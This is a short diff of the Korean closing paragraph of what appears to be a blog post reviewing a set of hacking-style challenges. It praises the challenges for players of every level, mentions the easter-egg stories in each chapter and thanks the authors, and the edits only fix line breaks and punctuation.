+전반적으로 문제를 정말 재밌게 만들어주신 것 같아 많은 분들이 풀어보시면, 초보자 분들은 기법을 익히는 기회가, 중급자 분들은 기법에 익숙해지는 기회가, 고수 분들에게는 재밌게 문제를 풀며 게임을 하는 듯한 기분을 느낄 수 있을 것이라는 생각이 들었습니다.
 
-또한 챕터별로 존재하는 이스터에그 같은 스토리들도 생각보다 재밌었습니다! <br>
+또한 챕터별로 존재하는 이스터에그 같은 스토리들도 생각보다 재밌었습니다!
+
 문제를 만들어주신 모든 분들 정말 수고 많으셨다는 말씀드리며 글을 마치겠습니다.
 
-긴 글을 읽어주셔서 감사합니다
+긴 글을 읽어주셔서 감사합니다.
